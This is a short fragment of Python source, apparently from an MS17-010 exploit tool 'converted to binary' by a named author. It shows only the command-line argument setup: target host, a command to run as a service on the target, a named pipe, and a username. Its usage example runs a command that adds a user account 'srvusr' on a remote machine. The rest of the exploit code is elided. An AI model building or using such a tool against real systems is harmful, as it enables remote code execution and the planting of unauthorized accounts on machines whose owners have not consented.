...
# piece added by Ismael Goncalves
parser = argparse.ArgumentParser(description='''MS17-010 - zzz_explot modified and converted to binary https://github.com/irgonclaves/ms17-010''',epilog="Example: ms17-010.exe -t 172.16.0.2 -c \"net user /add srvusr teste123\"",formatter_class=argparse.RawDescriptionHelpFormatter)
parser.add_argument("-t", "--target", help="Target for exploitation", required=True)
parser.add_argument("-c", "--command", help="Command to be executed as a service",required=True)
parser.add_argument("-P", "--pipe", help="Pipe to connect (e.g. netlogon)")
parser.add_argument("-u", "--user", help="Username to authenticate in case no anomymous connection to a pipe is allowed")
...
# Piece modified by Ismael Goncalves
